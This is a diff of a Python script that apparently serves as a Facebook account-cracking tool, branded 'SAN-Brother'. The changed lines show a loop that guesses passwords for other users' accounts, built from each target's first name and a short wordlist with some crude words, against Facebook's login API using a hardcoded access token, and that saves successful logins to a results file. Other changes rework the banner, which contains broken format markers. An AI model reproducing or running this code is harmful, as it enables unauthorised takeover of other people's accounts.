@@ -62,7 +62,7 @@ def menu(n,toket):
 	global loop
 	loop=0
 	banner()
-	print("%s(●) %sWellcome %s%s"%(G,W,Y,n))
+	print("%s() %sWellcome %s%s"%(G,W,Y,n))
 	print("""
 %s## %s1 ID TEMAN
 %s## %s2 ID DARI TEMAN
@@ -116,7 +116,7 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"123",nama+"12345","@"+nama,"sayang","bangsat","kontol","ngiclik","anjing"]:
+		for pas in [nama+"123",nama+"12345","@"+nama,"sayang","Sayang","kontol","Kontol","anjing"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -179,12 +179,13 @@ def login():
 def banner():
 	os.system("clear")
 	print("""
-%s[+]%s====== %s SAN-Brother Auto Crack V.0.0.1%s ======%s[+]%s
+%s[+]%s====== %s SAN-Brother %s ======%s[+]%s
+            $s /¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯%s
+              $s/$s
 ╭══════════════════════════════════════════╮
-║%s# %sAuthor : %sDulLah%s %s                        ║
-║%s# %sReCode : %sSusanto%s  %s         ║
-║%s# %sGithub : %sHttps://github.com/unikers71%s%s   ║
-╰══════════════════════════════════════════╯
-           
- """%(R,W,GB,RE,R,W,Y,W,RM,RE,W,Y,W,CM,RE,W,Y,W,PM,RE,W))
+║  %s{\__/}%s	o Copyright    : S$sAN-Team$s  ║
+║ %s( ●_● )%s 	o Created Date : $s10-09-2019$s║
+║ %s( > 🌮$s  Repositories Education Version %sV.0.0.1.0 (Beta!)%s%s
+╰══════════════════════════════════════════╯           
+ """%(R,W,GB,RE,R,W,Y,W,RM,RE,W,Y,W,CM,RE,W,Y,W,PM,RE,W,GB,W,GB))
 cek()
